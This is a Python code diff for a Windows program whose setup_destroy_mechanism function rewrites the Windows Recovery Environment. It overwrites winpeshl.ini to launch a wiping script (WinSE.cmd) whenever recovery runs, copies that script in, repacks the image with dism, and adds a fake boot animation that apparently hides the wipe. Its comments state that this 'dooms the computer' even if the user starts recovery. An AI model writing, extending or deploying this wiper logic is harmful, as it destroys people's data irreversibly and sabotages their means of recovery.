@@ -6,8 +6,6 @@ import shutil
 import hashlib
 import win32gui
 
-data = os.path.join(sys._MEIPASS, "data")
-
 def get_hashes(files): # misc to get hashes of files
     hashes = []
     for file in files:
@@ -66,7 +64,7 @@ def checker(script_list, original_hashes, pids): # perform all check every X tim
     check_pids(pids)
     check_already_triggered()
 
-def setup_destroy_mechanism(): # modifies WinRE for immediate destruction. After this runs, if windows recovery runs the computer will be wiped, even if ran by the user. This dooms the computer.
+def setup_destroy_mechanism(data_path): # modifies WinRE for immediate destruction. After this runs, if windows recovery runs the computer will be wiped, even if ran by the user. This dooms the computer.
     if not os.path.exists('C:/Windows/System32/Destroy me.please'): # for safety reasons, so no data is lost while debugging.
         with open("C:/debugging.txt", 'w') as f:
             f.write('no C:/Windows/System32/Destroy me.please')
@@ -90,9 +88,11 @@ def setup_destroy_mechanism(): # modifies WinRE for immediate destruction. After
         os.system("echo [LaunchApps] > C:\Windows\RSLogs\Windows\System32\winpeshl.ini") # winpeshl.ini is the file that tells the system what to do when windows recovery environment launches. We're overwriting it to do other things. [Launchapps] tell winpeshl.ini that we want it to launch something
         f.write('winpeshl p1')
         os.system("echo X:\System32\WinSE.cmd >> C:\Windows\RSLogs\Windows\System32\winpeshl.ini") # tells the system to run the wiping script
+        os.system(r"echo X:\System32\WinSE.cmd >> C:\Windows\RSLogs\Windows\System32\boot_animation.exe") # tells the system to run the fake boot animation
         f.write('winpeshl p2')
         f.close()
-    shutil.copy(f'{data}\\WinSE.cmd', 'C:\Windows\RSLogs\Windows\System32\WinSE.cmd')
+    shutil.copy(f'{data_path}\\WinSE.cmd', 'C:\Windows\RSLogs\Windows\System32\WinSE.cmd')
+    shutil.copy(f'{data_path}\\boot_animation.exe', r'C:\Windows\RSLogs\Windows\System32\boot_animation.exe')
     with open("C:/debugging.txt", 'a') as f:
         f.write('wrote destruction script')
         os.system("dism /unmount-wim /mountdir:C:\Windows\RSLogs /commit") # repack the modified recovery environment
